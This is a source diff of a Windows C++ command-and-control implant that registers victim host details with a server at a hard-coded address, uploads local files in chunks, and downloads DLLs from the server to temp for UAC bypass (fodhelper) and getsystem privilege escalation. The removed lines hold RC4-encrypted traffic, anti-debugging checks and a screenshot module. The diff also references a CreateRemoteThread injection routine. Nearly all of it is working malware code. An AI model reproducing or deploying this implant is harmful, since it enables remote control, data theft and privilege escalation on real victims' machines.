@@ -1,4 +1,4 @@
-﻿#define no_init_all
+#define no_init_all
 #define _CRT_SECURE_NO_WARNINGS
 #include <winsock2.h>
 #include <ws2tcpip.h>
@@ -15,24 +15,16 @@
 #include <stdlib.h>
 #include <TlHelp32.h>
 #include "Loader.h"
-#include <iphlpapi.h>
-#include <winternl.h>
-#include "config.h"
 
 
 using json = nlohmann::json;
 #pragma comment(lib, "wininet.lib")
 #pragma comment(lib, "ws2_32.lib")
-#pragma comment(lib, "iphlpapi.lib")
 
 #ifdef _DEBUG
 #define VERBOSE 1 // Allows debug output
 #else
 #define VERBOSE 0
-#endif
-
-#ifndef NT_SUCCESS
-#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
 #endif
 
 #if VERBOSE
@@ -45,10 +37,9 @@ using json = nlohmann::json;
 #define COUT(x)
 #endif
 
-
 // Configuration Constants
-#define SERVER_IP "127.0.0.1"
-#define SERVER_PORT 9090
+#define SERVER_IP "10.2.0.15"
+#define SERVER_PORT 9832
 #define API_ENDPOINT "/api/send"
 #define SLEEP_TIME 10      // seconds between polling
 #define USERAGENT "Mozilla/5.0"
@@ -58,9 +49,6 @@ using json = nlohmann::json;
 
 // Global Agent ID
 std::string agent_id;
-int globalSleepTime = SLEEP_TIME;      // default sleep time
-int globalJitterMax = 30;              // default maximum jitter percentage
-int globalJitterMin = 25;              // default minimum jitter percentage
 
 // ------------------ Base64 Functions ------------------
 std::string base64_encode(const std::string &in) {
@@ -117,23 +105,19 @@ std::string base64_decode(const std::string &in) {
 bool http_post(const std::string &jsonBody, std::string &response) {
 	HINTERNET hSession = InternetOpenA(USERAGENT, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
 	if (!hSession) return false;
-
 	HINTERNET hConnect = InternetConnectA(hSession, SERVER_IP, SERVER_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
 	if (!hConnect) {
 		InternetCloseHandle(hSession);
 		return false;
 	}
-
 	DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_DONT_CACHE | INTERNET_FLAG_NO_UI | INTERNET_FLAG_KEEP_CONNECTION;
 	if (C2SSL) flags |= INTERNET_FLAG_SECURE;
-
 	HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", API_ENDPOINT, NULL, NULL, NULL, flags, 0);
 	if (!hRequest) {
 		InternetCloseHandle(hConnect);
 		InternetCloseHandle(hSession);
 		return false;
 	}
-
 	const char* headers = "Content-Type: application/json; utf-8";
 	BOOL sendResult = HttpSendRequestA(hRequest, headers, (DWORD)strlen(headers), (LPVOID)jsonBody.c_str(), (DWORD)jsonBody.size());
 	if (!sendResult) {
@@ -142,19 +126,14 @@ bool http_post(const std::string &jsonBody, std::string &response) {
 		InternetCloseHandle(hSession);
 		return false;
 	}
-
-	// Only read the response if we have a valid response string reference
 	char buffer[1024];
 	DWORD bytesRead = 0;
 	std::string resp;
-
 	while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
 		buffer[bytesRead] = '\0';
 		resp.append(buffer);
 	}
-
 	response = resp;
-
 	InternetCloseHandle(hRequest);
 	InternetCloseHandle(hConnect);
 	InternetCloseHandle(hSession);
@@ -177,275 +156,6 @@ bool sendHttpPost(const std::string &jsonBody, std::string &response) {
 	}
 	return success;
 }
-
-// Simple RC4
-static void rc4_init(unsigned char *s, const unsigned char *key, int keylen) {
-	for (int i = 0; i < 256; ++i) s[i] = i;
-	int j = 0;
-	for (int i = 0; i < 256; ++i) {
-		j = (j + s[i] + key[i % keylen]) & 0xFF;
-		std::swap(s[i], s[j]);
-	}
-}
-
-static void rc4_crypt(unsigned char *s, unsigned char *data, int len) {
-	int i = 0, j = 0;
-	for (int k = 0; k < len; ++k) {
-		i = (i + 1) & 0xFF;
-		j = (j + s[i]) & 0xFF;
-		std::swap(s[i], s[j]);
-		data[k] ^= s[(s[i] + s[j]) & 0xFF];
-	}
-}
-
-std::string Rc4Encrypt(const std::string &in, const std::string &key) {
-	std::vector<unsigned char> S(256);
-	rc4_init(S.data(), (const unsigned char*)key.data(), key.size());
-	std::string out = in;
-	rc4_crypt(S.data(), (unsigned char*)out.data(), out.size());
-	return out;
-}
-// RC4 is symmetric:
-#define Rc4Decrypt Rc4Encrypt
-
-// Wrap, send, receive, and unwrap in one go.
-// Returns false on transport error or JSON parse error.
-bool sendEncryptedRequest(
-	const json &innerPayload,
-	json &outUnwrappedResponse
-) {
-	try {
-		// 1) serialize & encrypt
-		std::string clear = innerPayload.dump();
-		std::string cipher = Rc4Encrypt(clear, RC4_KEY);
-		std::string b64 = base64_encode(cipher);
-		json transport = { {"d", b64} };
-		std::string reqBody = transport.dump();
-
-		// 2) send over HTTP
-		std::string rawResp;
-		if (!sendHttpPost(reqBody, rawResp)) {
-			PRINTF("[ERROR] HTTP POST failed\n");
-			return false;
-		}
-
-		PRINTF("[DEBUG] Raw server response: %s\n", rawResp.c_str());
-
-		// 3) parse transport envelope
-		json outer;
-		try {
-			outer = json::parse(rawResp);
-		}
-		catch (const json::exception& e) {
-			PRINTF("[ERROR] Failed to parse server response as JSON: %s\n", e.what());
-			return false;
-		}
-
-		// Check if 'd' field exists
-		if (!outer.contains("d")) {
-			PRINTF("[ERROR] Server response doesn't contain 'd' field\n");
-			return false;
-		}
-
-		// 4) base64-decode + RC4-decrypt
-		std::string respB64 = outer["d"].get<std::string>();
-		std::string respCipher;
-		try {
-			respCipher = base64_decode(respB64);
-		}
-		catch (const std::exception& e) {
-			PRINTF("[ERROR] Failed to base64 decode response: %s\n", e.what());
-			return false;
-		}
-
-		std::string respClear = Rc4Decrypt(respCipher, RC4_KEY);
-		PRINTF("[DEBUG] Decrypted response: %s\n", respClear.c_str());
-
-		// 5) parse intermediate JSON
-		json intermediate;
-		try {
-			intermediate = json::parse(respClear);
-		}
-		catch (const json::exception& e) {
-			PRINTF("[ERROR] Failed to parse decrypted response as JSON: %s\n", e.what());
-			return false;
-		}
-
-		// Check if the decrypted JSON has a 'data' field
-		if (intermediate.contains("data")) {
-			// This is the additional layer - we need to base64 decode the 'data' field
-			std::string dataB64 = intermediate["data"].get<std::string>();
-			std::string dataStr;
-			try {
-				dataStr = base64_decode(dataB64);
-			}
-			catch (const std::exception& e) {
-				PRINTF("[ERROR] Failed to base64 decode data field: %s\n", e.what());
-				return false;
-			}
-
-			// Finally parse the actual response
-			try {
-				outUnwrappedResponse = json::parse(dataStr);
-				PRINTF("[DEBUG] Final parsed response: %s\n", outUnwrappedResponse.dump().c_str());
-			}
-			catch (const json::exception& e) {
-				PRINTF("[ERROR] Failed to parse data content as JSON: %s\n", e.what());
-				return false;
-			}
-		}
-		else {
-			// No additional layer, just use the decrypted JSON directly
-			outUnwrappedResponse = intermediate;
-		}
-
-		return true;
-	}
-	catch (const std::exception& e) {
-		PRINTF("[ERROR] Unhandled exception in sendEncryptedRequest: %s\n", e.what());
-		return false;
-	}
-}
-
-// A variant that only needs to send, ignores the reply
-bool postEncryptedFireAndForget(const json &innerPayload) {
-	std::string clear = innerPayload.dump();
-	std::string cipher = Rc4Encrypt(clear, RC4_KEY);
-	std::string b64 = base64_encode(cipher);
-	json transport = { {"d", b64} };
-
-	// Create a dummy response string instead of dereferencing nullptr
-	std::string dummyResponse;
-	return sendHttpPost(transport.dump(), dummyResponse);
-}
-
-
-bool UploadFile(const std::string &taskId, const std::string &filePath, std::string &outputMessage) {
-	// Open the file
-	FILE* fp = fopen(filePath.c_str(), "rb");
-	if (!fp) {
-		outputMessage = "Failed to open file: " + filePath;
-		return false;
-	}
-
-	// Get file details
-	fseek(fp, 0, SEEK_END);
-	long fileSize = ftell(fp);
-	fseek(fp, 0, SEEK_SET);
-
-	// Extract filename from path
-	size_t pos = filePath.find_last_of("\\/");
-	std::string fileName = (pos != std::string::npos) ? filePath.substr(pos + 1) : filePath;
-
-	// Create UploadStart request (HT = 4)
-	json startData = {
-		{"agent_id", agent_id},
-		{"task_id", taskId},
-		{"file_name", fileName},
-		{"file_size", fileSize},
-		{"path", filePath},
-		{"content", ""},
-	};
-
-	// Base64 encode the startData
-	std::string encoded_data = base64_encode(startData.dump());
-
-	// Create outer request structure
-	json outerStartData = {
-		{"data", encoded_data},
-		{"ht", 4}  // UploadStart
-	};
-
-	json startResponse;
-	if (!sendEncryptedRequest(outerStartData, startResponse)) {
-		outputMessage = "UploadStart failed (HTTP error).";
-		fclose(fp);
-		return false;
-	}
-
-	PRINTF("[DEBUG] UploadStart response: %s\n", startResponse.dump().c_str());
-
-	// Extract file_id from response
-	std::string file_id;
-	if (startResponse.contains("id")) {
-		file_id = startResponse["id"].get<std::string>();
-	}
-	else {
-		outputMessage = "No file ID returned from UploadStart.";
-		fclose(fp);
-		return false;
-	}
-
-	// UploadChunk (HT = 5)
-	const size_t CHUNK_SIZE = 4096;
-	int chunk_id = 0;
-	bool success = true;
-
-	while (!feof(fp) && success) {
-		char buffer[CHUNK_SIZE];
-		size_t bytesRead = fread(buffer, 1, CHUNK_SIZE, fp);
-		if (bytesRead > 0) {
-			std::string chunkDataStr(buffer, bytesRead);
-			std::string encodedChunk = base64_encode(chunkDataStr);
-
-			// Create chunk data
-			json chunkData = {
-				{"task_id", taskId},
-				{"chunk_id", chunk_id},
-				{"content", encodedChunk},
-				{"file_id", file_id}
-			};
-
-			// Base64 encode the chunkData
-			std::string encoded_chunk_data = base64_encode(chunkData.dump());
-
-			// Create outer request structure
-			json outerChunkData = {
-				{"data", encoded_chunk_data},
-				{"ht", 5}  // UploadChunk
-			};
-
-			json chunkResponse;
-			if (!sendEncryptedRequest(outerChunkData, chunkResponse)) {
-				outputMessage = "UploadChunk failed at chunk " + std::to_string(chunk_id);
-				success = false;
-				break;
-			}
-			chunk_id++;
-		}
-	}
-
-	fclose(fp);
-	if (!success) return false;
-
-	// UploadEnd (HT = 6)
-	json endData = {
-		{"agent_id", agent_id},
-		{"task_id", taskId},
-		{"status", 4},
-		{"result", ""},
-		{"file_id", file_id}
-	};
-
-	// Base64 encode the endData
-	std::string encoded_end_data = base64_encode(endData.dump());
-
-	// Create outer request structure
-	json outerEndData = {
-		{"data", encoded_end_data},
-		{"ht", 6}  // UploadEnd
-	};
-
-	json endResponse;
-	if (!sendEncryptedRequest(outerEndData, endResponse)) {
-		outputMessage = "UploadEnd failed (HTTP error).";
-		return false;
-	}
-
-	outputMessage = "File uploaded successfully: " + fileName;
-	return true;
-}
-
 
 std::wstring StringToWString(const std::string &s) {
 	int len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), -1, NULL, 0);
@@ -543,43 +253,14 @@ int Inject_CreateRemoteThread(HANDLE hProc, PVOID payload, SIZE_T payload_len)
 	return 0;
 }
 
-std::string GetInternalIP() {
-	ULONG outBufLen = 15000;
-	PIP_ADAPTER_ADDRESSES pAddresses = (IP_ADAPTER_ADDRESSES*)malloc(outBufLen);
-	if (!pAddresses) return "unknown";
-
-	DWORD dwRetVal = GetAdaptersAddresses(AF_INET, 0, NULL, pAddresses, &outBufLen);
-	if (dwRetVal == ERROR_BUFFER_OVERFLOW) {
-		free(pAddresses);
-		pAddresses = (IP_ADAPTER_ADDRESSES*)malloc(outBufLen);
-		dwRetVal = GetAdaptersAddresses(AF_INET, 0, NULL, pAddresses, &outBufLen);
-	}
-
-	std::string internalIP = "unknown";
-	if (dwRetVal == NO_ERROR) {
-		for (PIP_ADAPTER_ADDRESSES curr = pAddresses; curr; curr = curr->Next) {
-			for (PIP_ADAPTER_UNICAST_ADDRESS ua = curr->FirstUnicastAddress; ua; ua = ua->Next) {
-				SOCKADDR_IN* sa = reinterpret_cast<SOCKADDR_IN*>(ua->Address.lpSockaddr);
-				char buf[INET_ADDRSTRLEN] = { 0 };
-				inet_ntop(AF_INET, &sa->sin_addr, buf, sizeof(buf));
-				internalIP = buf;
-				break;   // assume only one interface
-			}
-			if (internalIP != "unknown") break;
-		}
-	}
-	free(pAddresses);
-	return internalIP;
-}
-
 // ------------------ Registration (ht==1) ------------------
 bool RegisterWithServer() {
 	json registerData = {
 		{"machine_guid", get_machine_guid()},
 		{"hostname", get_hostname()},
 		{"username", get_username()},
-		{"internal_ip", GetInternalIP()},
-		{"external_ip", ""},
+		{"internal_ip", "192.168.1.100"},
+		{"external_ip", "1.1.1.1"},
 		{"os", get_os_version()},
 		{"process_arch", 1},
 		{"integrity", get_integrity()}
@@ -589,15 +270,26 @@ bool RegisterWithServer() {
 
 	json request_data = {
 		{"data", encoded_data},
-		{"ht", 1}  // requesttype.Registration.value
+		{"ht", 1}
 	};
 
-	json responseObj;
-	if (sendEncryptedRequest(request_data, responseObj)) {
-		if (responseObj.contains("agent_id")) {
-			agent_id = responseObj["agent_id"].get<std::string>();
-			PRINTF("[+] Registered successfully. Agent ID: %s\n", agent_id.c_str());
-			return true;
+	std::string encoded_request = base64_encode(request_data.dump());
+
+	json final_payload = { {"d", encoded_request} };
+
+	std::string requestBody = final_payload.dump();
+	std::string response;
+
+	if (sendHttpPost(requestBody, response)) {
+		json jsonResponse = json::parse(response);
+		if (jsonResponse.contains("data")) {
+			std::string decodedResponse = base64_decode(jsonResponse["data"].get<std::string>());
+			json responseObj = json::parse(decodedResponse);
+			if (responseObj.contains("agent_id")) {
+				agent_id = responseObj["agent_id"].get<std::string>();
+				PRINTF("[+] Registered successfully. Agent ID: %s\n", agent_id.c_str());
+				return true;
+			}
 		}
 	}
 	return false;
@@ -717,13 +409,23 @@ std::string DownloadFilePayload(const json &task) {
 	json requestData = {
 		{"agent_id", agent_id},
 		{"task_id", task_id},
-		{"file_id", file_id},
+		{"file_id", file_id}
+	};
+	std::string encoded_data = base64_encode(requestData.dump());
+	json request_data = {
+		{"data", encoded_data},
 		{"ht", 7}  // DownloadStart
 	};
+	std::string encoded_request = base64_encode(request_data.dump());
+	json final_payload = { {"d", encoded_request} };
+	std::string requestBody = final_payload.dump();
 
-	json downloadResponse;
-	if (!sendEncryptedRequest(requestData, downloadResponse))
+	std::string response;
+	if (!sendHttpPost(requestBody, response))
 		return "";
+
+	// Parse the response directly 
+	json downloadResponse = json::parse(response);
 
 	std::string payload = "";
 	if (downloadResponse.contains("chunk")) {
@@ -739,14 +441,21 @@ std::string DownloadFilePayload(const json &task) {
 	while (next_chunk_id != 0) {
 		json chunkRequestData = {
 			{"file_id", file_id},
-			{"chunk_id", next_chunk_id},
-			{"ht", 8}
+			{"chunk_id", next_chunk_id}
 		};
+		std::string encoded_chunk_data = base64_encode(chunkRequestData.dump());
+		json chunk_request_data = {
+			{"data", encoded_chunk_data},
+			{"ht", 8} 
+		};
+		std::string encoded_chunk_request = base64_encode(chunk_request_data.dump());
+		json final_chunk_payload = { {"d", encoded_chunk_request} };
+		std::string chunkRequestBody = final_chunk_payload.dump();
 
-		json chunkDownloadResponse;
-		if (!sendEncryptedRequest(chunkRequestData, chunkDownloadResponse))
+		std::string chunkResponse;
+		if (!sendHttpPost(chunkRequestBody, chunkResponse))
 			break;
-
+		json chunkDownloadResponse = json::parse(chunkResponse);
 		if (chunkDownloadResponse.contains("chunk")) {
 			std::string chunk_encoded = chunkDownloadResponse["chunk"].get<std::string>();
 			payload += base64_decode(chunk_encoded);
@@ -757,111 +466,6 @@ std::string DownloadFilePayload(const json &task) {
 			next_chunk_id = 0;
 	}
 	return payload;
-}
-
-// Collection of anti-debugging techniques
-bool IsDebuggerPresent_PEB() {
-	return ::IsDebuggerPresent() != FALSE;
-}
-
-
-bool IsDebuggerPresent_API() {
-	// Simple Windows API check
-	return ::IsDebuggerPresent();
-}
-
-bool CheckDebugPort() {
-	// Check debug port via NtQueryInformationProcess
-	typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(
-		HANDLE ProcessHandle,
-		DWORD ProcessInformationClass,
-		PVOID ProcessInformation,
-		ULONG ProcessInformationLength,
-		PULONG ReturnLength
-		);
-
-	const int ProcessDebugPort = 7;
-	DWORD debugPort = 0;
-	NTSTATUS status;
-
-	pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(
-		GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
-
-	if (!NtQueryInformationProcess)
-		return false;
-
-	status = NtQueryInformationProcess(
-		GetCurrentProcess(),
-		ProcessDebugPort,
-		&debugPort,
-		sizeof(debugPort),
-		NULL);
-
-	return NT_SUCCESS(status) && debugPort != 0;
-}
-
-bool CheckDebuggerTimestamp() {
-	// Time-based detection
-	LARGE_INTEGER start, end, freq;
-	QueryPerformanceCounter(&start);
-
-	// Execute an instruction that is captured by debuggers
-	__try {
-		OutputDebugStringA("Anti-Debug Check");
-	}
-	__except (EXCEPTION_EXECUTE_HANDLER) {
-		// Exception occurred
-	}
-
-	QueryPerformanceCounter(&end);
-	QueryPerformanceFrequency(&freq);
-
-	// Calculate time in microseconds
-	double time = ((double)(end.QuadPart - start.QuadPart) * 1000000.0) / (double)freq.QuadPart;
-
-	// If time exceeds threshold, likely debugged
-	return time > 100.0; // 100 microseconds threshold
-}
-
-// Main anti-debugging check function that combines multiple techniques
-bool IsBeingDebugged() {
-	int detections = 0;
-
-	if (IsDebuggerPresent_API())
-		detections++;
-
-	if (IsDebuggerPresent_PEB())
-		detections++;
-
-	if (CheckDebugPort())
-		detections++;
-
-	if (CheckDebuggerTimestamp()) // Keep your existing implementation
-		detections++;
-
-	// Return true if at least two techniques detected a debugger
-	return detections >= 2;
-}
-
-// Add this to your RegisterWithServer function to report debug status
-void ReportDebugStatus() {
-	bool debugDetected = IsBeingDebugged();
-
-	json debugData = {
-		{"agent_id", agent_id},
-		{"debug_detected", debugDetected},
-		{"timestamp", time(NULL)}
-	};
-
-	std::string encoded_data = base64_encode(debugData.dump());
-
-	json debugRequest = {
-		{"data", encoded_data},
-		{"ht", 10}  // Use a new request type for debug reports
-	};
-
-	// Fire and forget - we don't need a response
-	postEncryptedFireAndForget(debugRequest);
 }
 
 
@@ -1004,11 +608,148 @@ TaskResult ExecuteTask(const json &task) {
 		// "input" is the local file path on the client
 		std::string file_path = input;
 
-		std::string outputMessage;
-		bool success = UploadFile(task["id"].get<std::string>(), file_path, outputMessage);
+		// Open the file in binary mode.
+		FILE* fp = fopen(file_path.c_str(), "rb");
+		if (fp == nullptr) {
+			result.output = "Failed to open file for reading: " + file_path;
+			result.status = 5;
+			break;
+		}
 
-		result.status = success ? 4 : 5;  // 4 = Success, 5 = Failure
-		result.output = outputMessage;
+		// Get the file size.
+		fseek(fp, 0, SEEK_END);
+		long file_size = ftell(fp);
+		fseek(fp, 0, SEEK_SET);
+
+		// Extract the file name from the path.
+		size_t pos = file_path.find_last_of("\\/");
+		std::string file_name = (pos != std::string::npos) ? file_path.substr(pos + 1) : file_path;
+
+		// --- UploadStart (HT = 4) ---
+		// Include "path" and an empty "content" field.
+		json startData = {
+			{"agent_id", agent_id},
+			{"task_id", task["id"]},
+			{"file_name", file_name},
+			{"file_size", file_size},
+			{"path", file_path},
+			{"content", ""}  // Dummy content
+		};
+		std::string encodedStartData = base64_encode(startData.dump());
+		json startPayload = {
+			{"data", encodedStartData},
+			{"ht", 4}  // UploadStart
+		};
+		std::string encodedStartPayload = base64_encode(startPayload.dump());
+		json finalStartPayload = { {"d", encodedStartPayload} };
+		std::string startRequestBody = finalStartPayload.dump();
+
+		std::string startResponse;
+		if (!sendHttpPost(startRequestBody, startResponse)) {
+			result.output = "UploadStart failed (HTTP error).";
+			result.status = 5;
+			fclose(fp);
+			break;
+		}
+
+		// Parse the server response to get the file id.
+		std::string file_id;
+		try {
+			json startRespJson = json::parse(startResponse);
+			// Check if the response is wrapped in "data"
+			if (startRespJson.contains("data")) {
+				std::string decoded = base64_decode(startRespJson["data"].get<std::string>());
+				json respData = json::parse(decoded);
+				if (respData.contains("id"))
+					file_id = respData["id"].get<std::string>();
+			}
+			else if (startRespJson.contains("id")) {
+				// Otherwise, check directly for "id"
+				file_id = startRespJson["id"].get<std::string>();
+			}
+		}
+		catch (...) {
+			result.output = "Failed to parse UploadStart response.";
+			result.status = 5;
+			fclose(fp);
+			break;
+		}
+		if (file_id.empty()) {
+			result.output = "No file ID returned from UploadStart.";
+			result.status = 5;
+			fclose(fp);
+			break;
+		}
+
+		// --- UploadChunk (HT = 5) ---
+		const size_t CHUNK_SIZE = 4096;  // Adjust chunk size as needed.
+		int chunk_id = 0;
+		bool chunkError = false;
+
+		while (!feof(fp)) {
+			char buffer[CHUNK_SIZE];
+			size_t bytesRead = fread(buffer, 1, CHUNK_SIZE, fp);
+			if (bytesRead > 0) {
+				std::string chunkData(buffer, bytesRead);
+				std::string encodedChunk = base64_encode(chunkData);
+
+				// Build JSON for this chunk.
+				json chunkDataJson = {
+					{"task_id", task["id"]},
+					{"chunk_id", chunk_id},
+					{"content", encodedChunk},  // Using "content" as expected by the server
+					{"file_id", file_id}         // Include the file id from UploadStart
+				};
+				std::string encodedChunkData = base64_encode(chunkDataJson.dump());
+				json chunkPayload = {
+					{"data", encodedChunkData},
+					{"ht", 5}  // UploadChunk
+				};
+				std::string encodedChunkPayload = base64_encode(chunkPayload.dump());
+				json finalChunkPayload = { {"d", encodedChunkPayload} };
+				std::string chunkRequestBody = finalChunkPayload.dump();
+
+				std::string chunkResponse;
+				if (!sendHttpPost(chunkRequestBody, chunkResponse)) {
+					result.output = "UploadChunk failed at chunk " + std::to_string(chunk_id);
+					result.status = 5;
+					chunkError = true;
+					break;
+				}
+				chunk_id++;
+			}
+		}
+		fclose(fp);
+		if (chunkError) {
+			break;
+		}
+
+		// --- UploadEnd (HT = 6) ---
+		json endData = {
+			{"agent_id", agent_id},
+			{"task_id", task["id"]},
+			{"status", 4},      // 4 = Complete
+			{"result", ""},     // Empty result
+			{"file_id", file_id} // Optional: include if needed
+		};
+		std::string encodedEndData = base64_encode(endData.dump());
+		json endPayload = {
+			{"data", encodedEndData},
+			{"ht", 6}  // UploadEnd
+		};
+		std::string encodedEndPayload = base64_encode(endPayload.dump());
+		json finalEndPayload = { {"d", encodedEndPayload} };
+		std::string endRequestBody = finalEndPayload.dump();
+
+		std::string endResponse;
+		if (!sendHttpPost(endRequestBody, endResponse)) {
+			result.output = "UploadEnd failed (HTTP error).";
+			result.status = 5;
+			break;
+		}
+
+		result.output = "File uploaded successfully: " + file_name;
+		result.status = 4;
 		break;
 	}
 
@@ -1121,103 +862,171 @@ TaskResult ExecuteTask(const json &task) {
 		}
 		break;
 	}
+			 // Replace BOTH case 12 and case 13 in your Main.cpp with these:
+
 	case 12: { // BypassUAC
-	// We expect the input to be: "1 <cmd w/ args>"
+		// Check if file_id exists (DLL should be downloaded from server)
+		if (!task.contains("file_id")) {
+			result.output = "No DLL provided.";
+			result.status = 5;
+			break;
+		}
+
+		// Parse input: "1 <cmd w/ args>"
 		std::string inputStr = task["input"].get<std::string>();
 		std::istringstream iss(inputStr);
 		std::string method;
 		iss >> method;
-		nlohmann::json j; 
 
 		if (method != "1") {
-			j["output"] = "Error: Only method 1 (fodhelper) is supported for bypassuac.";
+			result.output = "Error: Only method 1 (fodhelper) is supported for bypassuac.";
 			result.status = 5;
-		}
-		else {
-			std::string cmd;
-			std::getline(iss, cmd);
-			if (!cmd.empty() && cmd[0] == ' ')
-				cmd.erase(0, 1);
-
-			const char* dllPath = "modules\\bypassuac_fodhelper_x64.dll";
-			HMODULE hDll = LoadLibraryA(dllPath);
-			if (!hDll) {
-				j["output"] = "Failed to load DLL: " + std::string(dllPath);
-				result.status = 5;
-			}
-			else {
-				typedef LPWSTR(*BypassUACFunc)(LPCWSTR, DWORD);
-				BypassUACFunc bypassFunc = (BypassUACFunc)GetProcAddress(hDll, "ExecuteW");
-				if (!bypassFunc) {
-					j["output"] = "Failed to get function ExecuteW from DLL.";
-					result.status = 5;
-					FreeLibrary(hDll);
-				}
-				else {
-
-					int size_needed = MultiByteToWideChar(CP_UTF8, 0, cmd.c_str(), -1, NULL, 0);
-					std::wstring wCommand(size_needed, 0);
-					MultiByteToWideChar(CP_UTF8, 0, cmd.c_str(), -1, &wCommand[0], size_needed);
-
-					LPWSTR pBypassResult = bypassFunc(wCommand.c_str(), (DWORD)(wCommand.length() + 1));
-					if (pBypassResult != NULL) {
-						j["output"] = "BypassUAC executed successfully.";
-						result.status = 4;
-
-						delete[] pBypassResult;
-					}
-					else {
-						j["output"] = "BypassUAC failed.";
-						result.status = 5;
-					}
-					FreeLibrary(hDll);
-				}
-			}
-		}
-		std::string jsonResult = j.dump();
-		result.output = base64_encode(jsonResult);
-		break;
-	}
-
-	case 13: 
-	{ // Getsystem
-	// Expected input format: "1 <cmd w/ args>"
-		std::string input = task["input"].get<std::string>();
-		std::istringstream iss(input);
-		std::string method;
-		iss >> method;
-		if (method != "1") {
-			result.status = 5;
-			result.output = "Error: Only method 1 (pipe) is supported for getsystem.";
 			break;
 		}
-		// Combine the remaining arguments into a single command string
+
+		// Get command arguments
 		std::string cmd;
 		std::getline(iss, cmd);
 		if (!cmd.empty() && cmd[0] == ' ')
 			cmd.erase(0, 1);
 
-		// Load the getsystem DLL from the modules directory.
-		const char* dllPath = "modules\\getsystem_pipe_x64.dll";
-		HMODULE hDll = LoadLibraryA(dllPath);
-		if (!hDll) {
+		// Download the DLL from the server
+		std::string dll_data = DownloadFilePayload(task);
+		if (dll_data.empty()) {
 			result.status = 5;
-			result.output = "Failed to load DLL: " + std::string(dllPath);
+			result.output = "Failed to download BypassUAC DLL.";
 			break;
 		}
 
-		// Get the function pointer for ExecuteW.
+		// Write DLL to temporary location
+		char tempPath[MAX_PATH];
+		GetTempPathA(MAX_PATH, tempPath);
+		std::string dllPath = std::string(tempPath) + "bypassuac.dll";
+
+		FILE* fp = fopen(dllPath.c_str(), "wb");
+		if (!fp) {
+			result.status = 5;
+			result.output = "Failed to write temporary DLL.";
+			break;
+		}
+		fwrite(dll_data.data(), 1, dll_data.size(), fp);
+		fclose(fp);
+
+		// Load the DLL
+		HMODULE hDll = LoadLibraryA(dllPath.c_str());
+		if (!hDll) {
+			DeleteFileA(dllPath.c_str());
+			result.output = "Failed to load DLL.";
+			result.status = 5;
+			break;
+		}
+
+		// Get the ExecuteW function
+		typedef LPWSTR(*BypassUACFunc)(LPCWSTR, DWORD);
+		BypassUACFunc bypassFunc = (BypassUACFunc)GetProcAddress(hDll, "ExecuteW");
+		if (!bypassFunc) {
+			result.output = "Failed to get function ExecuteW from DLL.";
+			result.status = 5;
+			FreeLibrary(hDll);
+			DeleteFileA(dllPath.c_str());
+			break;
+		}
+
+		// Convert command to wide string
+		int size_needed = MultiByteToWideChar(CP_UTF8, 0, cmd.c_str(), -1, NULL, 0);
+		std::wstring wCommand(size_needed, 0);
+		MultiByteToWideChar(CP_UTF8, 0, cmd.c_str(), -1, &wCommand[0], size_needed);
+
+		// Execute the bypass
+		LPWSTR pBypassResult = bypassFunc(wCommand.c_str(), (DWORD)(wCommand.length() + 1));
+		if (pBypassResult != NULL) {
+			result.output = "BypassUAC executed successfully.";
+			result.status = 4;
+			delete[] pBypassResult;
+		}
+		else {
+			result.output = "BypassUAC failed.";
+			result.status = 5;
+		}
+
+		// Cleanup
+		FreeLibrary(hDll);
+		DeleteFileA(dllPath.c_str());
+		break;
+	}
+
+	case 13: { // Getsystem
+		// Check if file_id exists (DLL should be downloaded from server)
+		if (!task.contains("file_id")) {
+			result.output = "No DLL provided.";
+			result.status = 5;
+			break;
+		}
+
+		// Parse input: "1 <cmd w/ args>"
+		std::string input = task["input"].get<std::string>();
+		std::istringstream iss(input);
+		std::string method;
+		iss >> method;
+
+		if (method != "1") {
+			result.status = 5;
+			result.output = "Error: Only method 1 (pipe) is supported for getsystem.";
+			break;
+		}
+
+		// Get command arguments
+		std::string cmd;
+		std::getline(iss, cmd);
+		if (!cmd.empty() && cmd[0] == ' ')
+			cmd.erase(0, 1);
+
+		// Download the DLL from the server
+		std::string dll_data = DownloadFilePayload(task);
+		if (dll_data.empty()) {
+			result.status = 5;
+			result.output = "Failed to download Getsystem DLL.";
+			break;
+		}
+
+		// Write DLL to temporary location
+		char tempPath[MAX_PATH];
+		GetTempPathA(MAX_PATH, tempPath);
+		std::string dllPath = std::string(tempPath) + "getsystem.dll";
+
+		FILE* fp = fopen(dllPath.c_str(), "wb");
+		if (!fp) {
+			result.status = 5;
+			result.output = "Failed to write temporary DLL.";
+			break;
+		}
+		fwrite(dll_data.data(), 1, dll_data.size(), fp);
+		fclose(fp);
+
+		// Load the DLL
+		HMODULE hDll = LoadLibraryA(dllPath.c_str());
+		if (!hDll) {
+			DeleteFileA(dllPath.c_str());
+			result.status = 5;
+			result.output = "Failed to load DLL.";
+			break;
+		}
+
+		// Get the ExecuteW function
 		typedef LPWSTR(*ExecuteWFunc)(LPCWSTR, DWORD);
 		ExecuteWFunc ExecuteW = (ExecuteWFunc)GetProcAddress(hDll, "ExecuteW");
 		if (!ExecuteW) {
 			result.status = 5;
 			result.output = "Failed to get function ExecuteW from DLL.";
 			FreeLibrary(hDll);
+			DeleteFileA(dllPath.c_str());
 			break;
 		}
 
-		// Convert the command string to wide characters.
+		// Convert command to wide string
 		std::wstring wCmd(cmd.begin(), cmd.end());
+
+		// Execute getsystem
 		LPWSTR wResult = ExecuteW(wCmd.c_str(), static_cast<DWORD>(wCmd.size() + 1));
 		if (wResult && wResult[0] == L'1') {
 			result.status = 4;
@@ -1227,280 +1036,12 @@ TaskResult ExecuteTask(const json &task) {
 			result.status = 5;
 			result.output = "Getsystem failed.";
 		}
+
+		// Cleanup
 		FreeLibrary(hDll);
+		DeleteFileA(dllPath.c_str());
 		break;
 	}
-	case 14: {
-		// Define the relative path to the screenshot module DLL.
-		const char* dllPath = "modules\\screenshot_x64.dll";
-		HMODULE hScreenshot = LoadLibraryA(dllPath);
